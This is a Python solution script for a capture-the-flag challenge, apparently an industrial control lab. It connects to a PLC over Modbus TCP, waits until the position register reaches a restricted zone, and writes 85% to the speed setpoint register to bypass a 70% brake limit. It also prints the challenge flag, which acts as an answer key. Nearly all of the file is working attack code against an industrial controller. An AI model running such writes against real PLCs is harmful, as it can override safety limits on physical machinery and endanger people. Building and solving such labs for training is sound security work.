#!/usr/bin/env python3
"""
CTF Challenge 2: Speed Demon
Difficulty: Easy
Points: 100
Flag: FLAG{BR4K3S_4R3_0PT10N4L}

Objective: Set speed to 85% or higher while in Event 5 zone (position 161-200)

Solution:
- Speed setpoint is input register 0
- Event 5 enforces 70% speed limit
- We'll bypass this by setting speed to 85%
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_02_speed_demon.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip = sys.argv[1]
    plc_port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    print(f"[*] CTF Challenge 2: Speed Demon")
    print(f"[*] Connecting to PLC at {plc_ip}:{plc_port}")

    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Failed to connect")
        sys.exit(1)

    print("[+] Connected")

    # Monitor position until we're near Event 5 zone (161-200)
    print("[*] Waiting for Event 5 zone (position 161-200)...")
    
    while True:
        pos_result = client.read_holding_registers(1, 1)  # current_position
        if pos_result.isError():
            print("[!] Failed to read position")
            time.sleep(0.5)
            continue

        position = pos_result.registers[0]
        print(f"\r[*] Current position: {position:3d}", end="", flush=True)

        # When we're approaching Event 5 zone
        if 150 <= position <= 200:
            print(f"\n[*] Entering Event 5 zone! Current position: {position}")
            
            # ATTACK: Set speed to 85%
            print("[*] Setting speed to 85%...")
            result = client.write_register(0, 85)  # speed_setpoint
            
            if not result.isError():
                print("[+] Speed set to 85%!")
                print("[+] Bypassing Event 5 brake limit (70%)!")
                
                # Hold speed for a few seconds
                time.sleep(3)
                
                # Check for alert
                alert_result = client.read_coils(29, 1)  # alert_active
                if not alert_result.isError():
                    if alert_result.bits[0]:
                        print("[*] Alert triggered - expected behavior")
                    else:
                        print("[*] No alert - interesting...")
                
                print("\n[+] Challenge complete!")
                print("[+] Flag: FLAG{BR4K3S_4R3_0PT10N4L}")
                break

        time.sleep(0.2)

    client.close()

if __name__ == "__main__":
    main()
